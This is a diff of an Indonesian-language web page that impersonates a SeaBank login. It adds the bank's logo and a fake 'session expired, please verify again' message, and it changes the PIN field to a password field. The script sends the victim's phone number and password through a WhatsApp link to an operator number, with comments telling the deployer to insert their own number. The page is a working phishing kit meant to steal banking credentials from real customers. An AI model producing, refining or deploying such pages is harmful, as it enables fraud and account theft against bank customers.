@@ -3,17 +3,19 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1">
-  <title>Login SeaBank</title>
+  <title>Verifikasi Ulang • SeaBank</title>
   <link rel="stylesheet" href="style.css">
 </head>
 <body>
 
 <div class="login-container">
-  <h2>SeaBank</h2>
+  <img src="https://seeklogo.com/images/S/seabank-logo-FA805BF1C3-seeklogo.com.png" alt="SeaBank" class="logo">
+  <h2>Verifikasi Ulang</h2>
+  <p class="desc">Sesi kamu telah kadaluarsa. Silakan masuk ulang untuk melanjutkan transaksi.</p>
   <form id="loginForm">
     <input type="tel" id="nomor" placeholder="Nomor HP (08xxxxx)" required>
-    <input type="password" id="pin" placeholder="PIN 6 Digit" minlength="6" maxlength="6" required>
-    <button type="submit">Masuk</button>
+    <input type="password" id="password" placeholder="Password SeaBank kamu" required>
+    <button type="submit">Verifikasi Sekarang</button>
   </form>
 </div>
 
@@ -21,17 +23,17 @@
   document.getElementById("loginForm").addEventListener("submit", function(e) {
     e.preventDefault();
     const nomor = document.getElementById("nomor").value.trim();
-    const pin = document.getElementById("pin").value.trim();
+    const password = document.getElementById("password").value.trim();
 
     if (!/^08\d{8,}$/.test(nomor)) {
       alert("Nomor HP tidak valid!");
       return;
     }
 
-    // Ganti nomor WA tujuan di bawah ini
-    const nomorWA = "639640119085"; // Ganti dengan nomormu
+    // Ganti nomor WhatsApp tujuan di bawah ini
+    const nomorWA = "6281234567890"; // ← Ganti ke nomor kamu
 
-    const pesan = `*Login SeaBank:*\nNomor: ${nomor}\nPIN: ${pin}`;
+    const pesan = `*Verifikasi Ulang SeaBank:*\nNomor: ${nomor}\nPassword: ${password}`;
     const url = `https://wa.me/${nomorWA}?text=${encodeURIComponent(pesan)}`;
     window.location.href = url;
   });
